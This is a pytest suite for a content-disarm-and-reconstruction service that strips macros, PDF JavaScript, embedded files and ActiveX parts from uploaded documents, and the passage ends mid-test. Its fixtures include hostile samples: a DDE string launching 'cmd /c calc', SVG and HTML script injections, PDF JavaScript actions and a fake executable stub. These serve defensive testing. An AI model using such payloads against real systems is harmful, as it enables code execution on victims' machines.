# ── Handler integration tests (mocked S3 / SNS) ────────────────────────────────

class TestHandler:

    def _event(self, bucket: str, key: str, size: int = 1024) -> dict:
        return {
            "detail": {
                "bucket": {"name": bucket},
                "object": {"key": key, "size": size},
            }
        }

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_handler_docx(self, mock_dl, mock_ul, mock_pub, mock_s3):
        mock_dl.return_value = (_make_docx_with_macro(), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src-bucket", "uploads/report.docx"), None)

        assert result["status"] == "sanitised"
        assert "report.docx" in result["destination"]
        mock_ul.assert_called_once()
        mock_pub.assert_called_once()
        mock_s3.delete_object.assert_called_once_with(Bucket="src-bucket", Key="uploads/report.docx")

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_handler_pdf(self, mock_dl, mock_ul, mock_pub, mock_s3):
        mock_dl.return_value = (_make_pdf_with_js(), "application/pdf")
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src-bucket", "docs/invoice.pdf"), None)

        assert result["status"] == "sanitised"
        assert len(result["report"]["report"]["removed"]) > 0
        mock_s3.delete_object.assert_called_once_with(Bucket="src-bucket", Key="docs/invoice.pdf")

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_handler_unsupported_ext_fails_closed(self, mock_dl, mock_ul, mock_pub, mock_s3):
        """An unrecognised extension must FAIL CLOSED: quarantined as unsupported-format,
        never uploaded to SANITISED_BUCKET with a 'sanitised' label. Source is deleted."""
        mock_dl.return_value = (b"raw binary data", "application/octet-stream")
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src-bucket", "archive.tar.gz"), None)

        assert result["status"] == "unsupported-format"
        # The only _upload call must target the quarantine bucket, NOT the sanitised one.
        assert mock_ul.call_count == 1
        upload_bucket = mock_ul.call_args[0][0]
        assert upload_bucket == cdr.QUARANTINE_BUCKET
        assert upload_bucket != cdr.SANITISED_BUCKET
        # The result published to SNS is 'unsupported-format', not 'sanitised'.
        assert mock_pub.call_args[0][2] == "unsupported-format"
        mock_s3.delete_object.assert_called_once_with(Bucket="src-bucket", Key="archive.tar.gz")

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_active_content_carriers_never_sanitised(self, mock_dl, mock_ul, mock_pub, mock_s3):
        """RTF, SVG, HTML, LNK — active-content carriers — must fail closed, never land in
        SANITISED_BUCKET. Regression for the fail-open passthrough vulnerability."""
        mock_s3.delete_object.return_value = {}
        for key, payload in (
            ("doc.rtf", b"{\\rtf1 {\\object ...}}"),
            ("img.svg", b"<svg onload=\"alert(1)\"><script>evil()</script></svg>"),
            ("page.html", b"<html><script>evil()</script></html>"),
            ("shortcut.lnk", b"\x4c\x00\x00\x00"),
        ):
            mock_ul.reset_mock(); mock_pub.reset_mock()
            mock_dl.return_value = (payload, "application/octet-stream")
            result = cdr.handler(self._event("src-bucket", key), None)
            assert result["status"] == "unsupported-format", f"{key} not failed closed"
            for call in mock_ul.call_args_list:
                assert call[0][0] != cdr.SANITISED_BUCKET, f"{key} reached SANITISED_BUCKET"
            assert mock_pub.call_args[0][2] == "unsupported-format"


class TestReDoSBounded:
    """The DDE pipe and numeric-entity-run patterns must not exhibit super-linear
    backtracking — a single crafted text node could otherwise hang the Lambda past its
    300 s timeout and form an EventBridge retry loop (remote upload-only DoS)."""

    def test_numeric_entity_run_no_redos(self):
        # Long alphabetic run with no '&#...;' reference — the old two-star pattern was
        # O(n^2) here. Must complete near-instantly and leave the text unchanged.
        s = b"<w:t>" + b"A" * 200000 + b"</w:t>"
        t = time.time()
        clean, removed = cdr._strip_xml_macros(s, "doc.xml")
        assert time.time() - t < 1.0
        assert clean == s
        assert removed == []

    def test_dde_pipe_no_redos(self):
        # `a…|b…` with no '!alnum' suffix — the old unbounded quantifiers backtracked
        # quadratically. Must complete fast.
        s = b"<w:t>" + b"a" * 128000 + b"|" + b"b" * 128000 + b"</w:t>"
        t = time.time()
        cdr._strip_xml_macros(s, "doc.xml")
        assert time.time() - t < 1.0

    def test_redos_fixes_preserve_correctness(self):
        # Real threats still neutralised after the ReDoS hardening.
        c, _ = cdr._strip_xml_macros('&#68;&#68;&#69; http://evil'.encode(), "d.xml")
        assert b"_CDR_REMOVED_" in c and b"DDE" not in c
        c, _ = cdr._strip_xml_macros('<w:t>"cmd"| \' /c calc\'!A1</w:t>'.encode(), "d.xml")
        assert b"_CDR_REMOVED_" in c
        # Benign escapes and plain text untouched.
        c, removed = cdr._strip_xml_macros('<w:t>AT&amp;T deal</w:t>'.encode(), "d.xml")
        assert c == '<w:t>AT&amp;T deal</w:t>'.encode() and removed == []


class TestHandlerExtended:

    def _event(self, bucket: str, key: str, size: int = 1024) -> dict:
        return {
            "detail": {
                "bucket": {"name": bucket},
                "object": {"key": key, "size": size},
            }
        }

    @patch.object(cdr, "s3")
    def test_legacy_doc_quarantined_and_deleted(self, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"\xd0\xcf\x11\xe0LEGACY"),
            "ContentType": "application/msword",
        }
        mock_s3.put_object.return_value = {}
        mock_s3.delete_object.return_value = {}

        with patch.object(cdr, "_publish_result_safe") as mock_pub:
            result = cdr.handler(self._event("src", "report.doc"), None)

        assert result["status"] == "unsupported-format"
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="report.doc")
        mock_pub.assert_called_once()
        call_args = mock_pub.call_args[0]
        assert call_args[2] == "unsupported-format"

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_xlsm_handler_remaps_extension(self, mock_dl, mock_ul, mock_pub, mock_s3):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                       'package/2006/content-types"></Types>')
            z.writestr("_rels/.rels",
                       '<?xml version="1.0"?><Relationships xmlns="http://schemas.'
                       'openxmlformats.org/package/2006/relationships"/>')
            z.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO")
            z.writestr("xl/workbook.xml", "<workbook/>")
        mock_dl.return_value = (buf.getvalue(),
                                "application/vnd.ms-excel.sheet.macroEnabled.12")
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "uploads/data.xlsm"), None)

        assert result["status"] == "sanitised"
        assert result["destination"].endswith(".xlsx"), \
            f"Expected .xlsx destination, got: {result['destination']}"
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="uploads/data.xlsm")

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_handler_report_includes_original_ext(self, mock_dl, mock_ul, mock_pub, mock_s3):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                       'package/2006/content-types"></Types>')
            z.writestr("_rels/.rels",
                       '<?xml version="1.0"?><Relationships xmlns="http://schemas.'
                       'openxmlformats.org/package/2006/relationships"/>')
            z.writestr("xl/workbook.xml", "<workbook/>")
        mock_dl.return_value = (buf.getvalue(),
                                "application/vnd.ms-excel.sheet.macroEnabled.12")
        mock_s3.delete_object.return_value = {}

        cdr.handler(self._event("src", "uploads/data.xlsm"), None)

        payload = mock_pub.call_args[0][3]
        assert payload.get("original_ext") == "xlsm"
        assert payload.get("sanitised_ext") == "xlsx"


# ── Additional security regression tests ──────────────────────────────────────

class TestAcroFormJSSweep:
    """AcroForm field/widget JavaScript is recursively removed."""

    def _make_pdf_with_acroform_js(self) -> bytes:
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))

        field = pdf.make_indirect(pikepdf.Dictionary(
            T=pikepdf.String("field1"),
            FT=pikepdf.Name("/Tx"),
            AA=pikepdf.Dictionary(
                K=pikepdf.Dictionary(
                    S=pikepdf.Name("/JavaScript"),
                    JS=pikepdf.String("app.alert('xss');"),
                )
            ),
            JS=pikepdf.String("app.alert('direct_js');"),
        ))
        pdf.Root["/AcroForm"] = pikepdf.Dictionary(
            Fields=pikepdf.Array([field]),
        )
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_acroform_field_aa_stripped(self):
        clean, report = cdr.cdr_pdf(self._make_pdf_with_acroform_js())
        with pikepdf.open(io.BytesIO(clean)) as pdf:
            acroform = pdf.Root.get("/AcroForm")
            assert acroform is not None, "AcroForm container was dropped entirely"
            for field in acroform.get("/Fields", []):
                assert "/AA" not in field, "/AA still present in AcroForm field"
                assert "/JS" not in field, "/JS still present in AcroForm field"

    def test_acroform_sweep_recorded_in_report(self):
        _, report = cdr.cdr_pdf(self._make_pdf_with_acroform_js())
        assert any("AcroForm" in r for r in report["removed"]), \
            "AcroForm field sweep not recorded in report"


class TestPdfNamesEmbeddedFiles:
    """PDF /Names./EmbeddedFiles is removed."""

    def _make_pdf_with_embedded_file(self) -> bytes:
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))

        embedded = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Filespec"),
            F=pikepdf.String("malware.exe"),
        ))
        pdf.Root["/Names"] = pikepdf.Dictionary(
            EmbeddedFiles=pikepdf.Dictionary(
                Names=pikepdf.Array([pikepdf.String("malware.exe"), embedded])
            )
        )
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_embedded_files_removed(self):
        clean, report = cdr.cdr_pdf(self._make_pdf_with_embedded_file())
        with pikepdf.open(io.BytesIO(clean)) as pdf:
            if "/Names" in pdf.Root:
                assert "/EmbeddedFiles" not in pdf.Root["/Names"], \
                    "/Names./EmbeddedFiles still present after CDR"
        assert any("EmbeddedFiles" in r for r in report["removed"])


class TestAcroFormRootAA:
    """/AA (Additional Actions) on the AcroForm root dict must be stripped — not just
    catalog['/AA'] and per-field /AA."""

    def _make_pdf(self) -> bytes:
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        pdf.Root["/AcroForm"] = pikepdf.Dictionary(
            Fields=pikepdf.Array([]),
            AA=pikepdf.Dictionary(
                C=pikepdf.Dictionary(  # calculate action
                    S=pikepdf.Name("/JavaScript"),
                    JS=pikepdf.String("app.alert('calc');"),
                )
            ),
        )
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_acroform_root_aa_stripped(self):
        clean, report = cdr.cdr_pdf(self._make_pdf())
        with pikepdf.open(io.BytesIO(clean)) as pdf:
            acroform = pdf.Root.get("/AcroForm")
            assert acroform is not None, "AcroForm container was dropped entirely"
            assert "/AA" not in acroform, "/AA still present on AcroForm root"
        assert any("AcroForm/AA" in r for r in report["removed"])


class TestPdfFileAttachment:
    """Page-level /FileAttachment annotations smuggle embedded files past the catalog-level
    /Names./EmbeddedFiles strip. Their file specification (/FS, /EF) must be scrubbed."""

    def _make_pdf(self) -> bytes:
        pdf = pikepdf.Pdf.new()
        ef_stream = pdf.make_stream(b"MZ\x90\x00malware-bytes")
        filespec = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Filespec"),
            F=pikepdf.String("payload.exe"),
            EF=pikepdf.Dictionary(F=ef_stream),
        ))
        annot = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"),
            Subtype=pikepdf.Name("/FileAttachment"),
            Rect=pikepdf.Array([0, 0, 20, 20]),
            FS=filespec,
        ))
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
            Annots=pikepdf.Array([annot]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_file_attachment_filespec_scrubbed(self):
        clean, report = cdr.cdr_pdf(self._make_pdf())
        with pikepdf.open(io.BytesIO(clean)) as pdf:
            for page in pdf.pages:
                for annot in page.get("/Annots", []):
                    if annot.get("/Subtype") == "/FileAttachment":
                        assert "/FS" not in annot, "/FS still present on FileAttachment"
                        assert "/EF" not in annot, "/EF still present on FileAttachment"
        assert any("FileAttachment" in r for r in report["removed"])


class TestXlsbConversionPolicy:
    """xlsb files with sheet binaries are converted to xlsx — not quarantined.
    The handler routes the output to the sanitised bucket and deletes the source."""

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_xlsb_handler_sanitises_not_quarantines(self, mock_pub, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(_make_xlsb()),
            "ContentType": "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
        }
        mock_s3.put_object.return_value = {}
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(
            {"detail": {"bucket": {"name": "src"}, "object": {"key": "data.xlsb", "size": 512}}},
            None,
        )

        assert result["status"] == "sanitised"
        # Output key must be remapped to .xlsx
        assert result["destination"].endswith(".xlsx"), \
            f"Expected .xlsx destination, got: {result['destination']}"

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_xlsb_source_deleted_after_sanitise(self, mock_pub, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(_make_xlsb()),
            "ContentType": "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
        }
        mock_s3.put_object.return_value = {}
        mock_s3.delete_object.return_value = {}

        cdr.handler(
            {"detail": {"bucket": {"name": "src"}, "object": {"key": "data.xlsb", "size": 512}}},
            None,
        )
        mock_s3.delete_object.assert_called_once()

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_xlsb_output_is_valid_xlsx(self, mock_pub, mock_s3):
        """Sanitised xlsb produces valid xlsx bytes written to the sanitised bucket."""
        captured = {}

        def capture_put(**kwargs):
            if kwargs.get("Bucket") == "test-sanitised":
                captured["body"] = kwargs["Body"]
            return {}

        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(_make_xlsb(rows=[[7.0, 8.0]])),
            "ContentType": "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
        }
        mock_s3.put_object.side_effect = capture_put
        mock_s3.delete_object.return_value = {}

        cdr.handler(
            {"detail": {"bucket": {"name": "src"}, "object": {"key": "report.xlsb", "size": 512}}},
            None,
        )

        assert "body" in captured, "Nothing written to sanitised bucket"
        wb = openpyxl.load_workbook(io.BytesIO(captured["body"]))
        ws = wb.active
        assert ws.cell(1, 1).value == pytest.approx(7.0)
        assert ws.cell(1, 2).value == pytest.approx(8.0)


class TestOversizedCopyObject:
    """Oversized files use copy_object to quarantine — evidence preserved, source kept."""

    def _event(self, bucket: str, key: str, size: int) -> dict:
        return {"detail": {"bucket": {"name": bucket}, "object": {"key": key, "size": size}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_oversized_uses_copy_object(self, mock_pub, mock_s3):
        mock_s3.copy_object.return_value = {}

        result = cdr.handler(self._event("src", "big.docx", 200 * 1024 * 1024), None)

        assert result["status"] == "rejected"
        mock_s3.copy_object.assert_called_once()
        call_kwargs = mock_s3.copy_object.call_args[1]
        assert call_kwargs["Bucket"] == "test-quarantine"
        assert "big.docx" in call_kwargs["Key"]

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_oversized_does_not_delete_source(self, mock_pub, mock_s3):
        mock_s3.copy_object.return_value = {}

        cdr.handler(self._event("src", "big.docx", 200 * 1024 * 1024), None)

        mock_s3.delete_object.assert_not_called()


class TestZipRejectionDeletesSource:
    """ZIP validation hard-reject deletes source object to prevent retry loops."""

    def _event(self, bucket: str, key: str) -> dict:
        return {"detail": {"bucket": {"name": bucket}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    def test_bad_magic_deletes_source(self, mock_ul, mock_pub, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"NOT_A_ZIP_FILE" + b"\x00" * 100),
            "ContentType": "application/octet-stream",
        }
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "evil.docx"), None)

        assert result["status"] == "rejected"
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="evil.docx")

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    def test_duplicate_entry_deletes_source(self, mock_ul, mock_pub, mock_s3):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("word/document.xml", b"<doc/>")
            z.writestr("word/document.xml", b"<evil/>")
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(buf.getvalue()),
            "ContentType": "application/octet-stream",
        }
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "evil.docx"), None)

        assert result["status"] == "rejected"
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="evil.docx")


class TestZipAnomalyMetricEmitted:
    """A ZIP structural hard-reject must emit the CDR/Validation/ZipAnomalies metric so
    ops has visibility into structural attacks (the documented behaviour)."""

    def _event(self, bucket: str, key: str) -> dict:
        return {"detail": {"bucket": {"name": bucket}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_emit_zip_anomaly_metric")
    def test_bad_magic_emits_zip_anomaly_metric(self, mock_metric, mock_ul, mock_pub, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"NOT_A_ZIP_FILE" + b"\x00" * 100),
            "ContentType": "application/octet-stream",
        }
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "evil.docx"), None)

        assert result["status"] == "rejected"
        mock_metric.assert_called_once()

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_emit_zip_anomaly_metric")
    def test_duplicate_entry_emits_zip_anomaly_metric(self, mock_metric, mock_ul, mock_pub, mock_s3):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("word/document.xml", b"<doc/>")
            z.writestr("word/document.xml", b"<evil/>")
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(buf.getvalue()),
            "ContentType": "application/octet-stream",
        }
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "evil.docx"), None)

        assert result["status"] == "rejected"
        mock_metric.assert_called_once()


class TestDownloadContentLengthGuard:
    """_download refuses to buffer an object whose S3 ContentLength exceeds the limit,
    defending against a post-event object swap (the EventBridge size field is stale)."""

    @patch.object(cdr, "s3")
    def test_oversized_content_length_raises(self, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"x"),
            "ContentType": "application/octet-stream",
            "ContentLength": cdr._MAX_FILE_BYTES + 1,
        }
        with pytest.raises(ValueError):
            cdr._download("src", "swapped.docx")

    @patch.object(cdr, "s3")
    def test_normal_content_length_passes(self, mock_s3):
        mock_s3.get_object.return_value = {
            "Body": io.BytesIO(b"hello"),
            "ContentType": "text/plain",
            "ContentLength": 5,
        }
        data, ct = cdr._download("src", "ok.txt")
        assert data == b"hello"


class TestCdrModeTag:
    """Sanitised uploads carry cdr-mode=full."""

    def _event(self, bucket: str, key: str) -> dict:
        return {"detail": {"bucket": {"name": bucket}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_docx_upload_has_full_mode_tag(self, mock_dl, mock_ul, mock_pub, mock_s3):
        mock_dl.return_value = (_make_docx_with_macro(), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src", "report.docx"), None)

        assert result["status"] == "sanitised"
        upload_call = mock_ul.call_args
        tags = upload_call[0][4]
        assert tags.get("cdr-mode") == "full"


class TestActiveXContentTypesRemoved:
    """activeX content-type Override entries are removed from [Content_Types].xml."""

    def _make_activex_content_types(self) -> bytes:
        return (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="bin" ContentType="application/vnd.ms-office.activeX"/>'
            '<Override PartName="/xl/activeX/activeX1.xml"'
            ' ContentType="application/vnd.ms-office.activeX+xml"/>'
            '<Override PartName="/xl/workbook.xml"'
            ' ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"/>'
            '</Types>'
        ).encode()

    def test_activex_default_removed(self):
        clean, removed = cdr._sanitise_content_types(self._make_activex_content_types())
        assert b"activeX" not in clean, "activeX Default content-type not removed"
        assert any("activex" in r.lower() for r in removed)

    def test_activex_override_removed(self):
        clean, removed = cdr._sanitise_content_types(self._make_activex_content_types())
        assert b"activeX+xml" not in clean, "activeX+xml Override content-type not removed"

    def test_clean_override_preserved(self):
        clean, _ = cdr._sanitise_content_types(self._make_activex_content_types())
        assert b"spreadsheetml.sheet" in clean, "clean workbook content-type incorrectly removed"


# ── Production failure-path tests ─────────────────────────────────────────────

class TestSnsFailureDoesNotBlockSuccess:
    """SNS publish failure must not prevent source deletion or success response."""

    def _event(self, key: str = "report.docx") -> dict:
        return {"detail": {"bucket": {"name": "src"}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_sns_failure_still_returns_sanitised(self, mock_dl, mock_ul, mock_s3):
        mock_dl.return_value = (_make_docx_with_macro(), "application/octet-stream")
        mock_s3.delete_object.return_value = {}
        # Simulate SNS being down
        mock_s3.publish = MagicMock(side_effect=Exception("SNS unavailable"))

        with patch.object(cdr, "sns") as mock_sns:
            mock_sns.publish.side_effect = Exception("SNS unavailable")
            result = cdr.handler(self._event(), None)

        assert result["status"] == "sanitised"

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_sns_failure_still_deletes_source(self, mock_dl, mock_ul, mock_s3):
        mock_dl.return_value = (_make_docx_with_macro(), "application/octet-stream")
        mock_s3.delete_object.return_value = {}

        with patch.object(cdr, "sns") as mock_sns:
            mock_sns.publish.side_effect = Exception("SNS unavailable")
            cdr.handler(self._event(), None)

        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="report.docx")


class TestDeleteFailureDoesNotMaskSuccess:
    """delete_object failure must not cause the Lambda to return an error."""

    def _event(self, key: str = "report.docx") -> dict:
        return {"detail": {"bucket": {"name": "src"}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_delete_failure_returns_sanitised(self, mock_dl, mock_ul, mock_pub, mock_s3):
        mock_dl.return_value = (_make_docx_with_macro(), "application/octet-stream")
        mock_s3.delete_object.side_effect = Exception("AccessDenied")

        result = cdr.handler(self._event(), None)

        assert result["status"] == "sanitised", \
            "delete_object failure should not change the success response"


class TestNoSuchKeyDownload:
    """NoSuchKey on download should publish source-missing and not quarantine."""

    def _event(self, key: str = "report.docx") -> dict:
        return {"detail": {"bucket": {"name": "src"}, "object": {"key": key, "size": 512}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_nosuchkey_publishes_source_missing(self, mock_pub, mock_s3):
        from botocore.exceptions import ClientError
        mock_s3.get_object.side_effect = ClientError(
            {"Error": {"Code": "NoSuchKey", "Message": "Not Found"}}, "GetObject"
        )

        with pytest.raises(ClientError):
            cdr.handler(self._event(), None)

        # Should publish source-missing, not "error"
        statuses = [call.args[2] for call in mock_pub.call_args_list]
        assert "source-missing" in statuses, \
            f"Expected source-missing in published statuses, got {statuses}"

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    def test_nosuchkey_does_not_quarantine(self, mock_pub, mock_s3):
        from botocore.exceptions import ClientError
        mock_s3.get_object.side_effect = ClientError(
            {"Error": {"Code": "NoSuchKey", "Message": "Not Found"}}, "GetObject"
        )

        with pytest.raises(ClientError):
            cdr.handler(self._event(), None)

        mock_s3.put_object.assert_not_called()


class TestZeroByteFile:
    """Zero-byte files are handled without crashing."""

    def _event(self, key: str, size: int = 0) -> dict:
        return {"detail": {"bucket": {"name": "src"}, "object": {"key": key, "size": size}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_zero_byte_docx_handled(self, mock_dl, mock_ul, mock_pub, mock_s3):
        mock_dl.return_value = (b"", "application/octet-stream")
        mock_s3.delete_object.return_value = {}

        # A zero-byte file has bad magic → ZIP validation rejects it
        result = cdr.handler(self._event("empty.docx"), None)
        assert result["status"] in ("rejected", "error", "sanitised")


class TestMalformedEvent:
    """Missing event fields raise a structured error, not a bare KeyError."""

    def test_missing_bucket_name_raises_value_error(self):
        bad_event = {"detail": {"object": {"key": "file.docx", "size": 1024}}}
        with pytest.raises((ValueError, KeyError)):
            cdr.handler(bad_event, None)

    def test_missing_object_key_raises_value_error(self):
        bad_event = {"detail": {"bucket": {"name": "src"}}}
        with pytest.raises((ValueError, KeyError)):
            cdr.handler(bad_event, None)


class TestReadZipEntrySafe:
    """_read_zip_entry_safe enforces the decompression limit via chunked reading.
    The key invariant: the check uses a running byte counter, NOT item.file_size,
    so it catches any entry that exceeds the limit during actual decompression."""

    def _make_zip_entry(self, size: int) -> tuple[zipfile.ZipFile, zipfile.ZipInfo]:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr("payload.xml", b"A" * size)
        zf = zipfile.ZipFile(io.BytesIO(buf.getvalue()))
        return zf, zf.infolist()[0]

    def test_normal_entry_reads_correctly(self):
        """Entries within the limit are returned in full."""
        buf = io.BytesIO()
        payload = b"safe content"
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("doc.xml", payload)
        with zipfile.ZipFile(io.BytesIO(buf.getvalue())) as zf:
            result = cdr._read_zip_entry_safe(zf, zf.infolist()[0])
        assert result == payload

    def test_oversized_entry_raises_via_chunked_counter(self):
        """An entry exceeding _MAX_ENTRY_BYTES raises even though the check
        runs during read, not before. Temporarily lowers the limit so the
        test does not need to allocate 200 MB of memory."""
        original_limit = cdr._MAX_ENTRY_BYTES
        cdr._MAX_ENTRY_BYTES = 1024  # 1 KB sentinel for fast test
        try:
            # Entry is 2x the sentinel limit
            zf, item = self._make_zip_entry(2048)
            with zf:
                # item.file_size will honestly report 2048 — this is NOT a falsified
                # central directory test. The point is that the limit is enforced by
                # the chunked counter, not by a pre-read file_size comparison.
                assert item.file_size == 2048
                with pytest.raises(ValueError, match="exceeds decompression limit"):
                    cdr._read_zip_entry_safe(zf, item)
        finally:
            cdr._MAX_ENTRY_BYTES = original_limit

    def test_naive_file_size_check_would_pass_but_chunked_check_still_raises(self):
        """Demonstrate the falsified file_size attack vector. If the guard were
        'if item.file_size > limit: raise', an attacker could set file_size = 1
        in the central directory to bypass it. The chunked counter catches this
        regardless of what file_size reports.

        Note: Python's zipfile validates CRC, so patching CD bytes causes
        BadZipFile on read — meaning the runtime itself also rejects tampered ZIPs.
        This test confirms our *own* counter catches oversized content before the
        CRC check, proving defence-in-depth independent of zipfile's validation."""
        original_limit = cdr._MAX_ENTRY_BYTES
        cdr._MAX_ENTRY_BYTES = 512
        try:
            # Build a valid ZIP with a 1024-byte entry (2x our sentinel limit)
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
                z.writestr("payload.xml", b"B" * 1024)
            # Read it back normally (file_size == 1024, above our 512 sentinel)
            with zipfile.ZipFile(io.BytesIO(buf.getvalue())) as zf:
                item = zf.infolist()[0]
                # A naive guard: if item.file_size > limit would raise here too.
                # The point: our chunked reader also raises, independently.
                with pytest.raises(ValueError, match="exceeds decompression limit"):
                    cdr._read_zip_entry_safe(zf, item)
        finally:
            cdr._MAX_ENTRY_BYTES = original_limit

    def test_entry_exactly_at_limit_is_allowed(self):
        """An entry equal to the limit is accepted (boundary condition)."""
        original_limit = cdr._MAX_ENTRY_BYTES
        cdr._MAX_ENTRY_BYTES = 512
        try:
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
                z.writestr("ok.xml", b"X" * 512)
            with zipfile.ZipFile(io.BytesIO(buf.getvalue())) as zf:
                result = cdr._read_zip_entry_safe(zf, zf.infolist()[0])
            assert len(result) == 512
        finally:
